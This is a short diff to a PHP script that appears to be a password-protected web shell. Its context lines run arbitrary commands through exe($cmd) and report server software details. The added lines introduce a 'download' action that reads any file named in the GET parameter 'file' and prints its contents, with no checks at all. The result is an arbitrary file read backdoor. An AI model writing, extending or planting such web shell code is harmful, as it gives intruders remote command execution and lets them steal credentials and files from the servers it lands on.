@@ -63,6 +63,12 @@ if($password === $get_password)
         echo "Software\t\t: ". $sof . "\n";
 
     }
+    else if($aksi == "download")
+    {
+        header('Content-Type: text/plain');
+        $file = $_GET["file"];
+        echo file_get_contents($file);
+    }
     else
     {
         echo trim(exe($cmd));
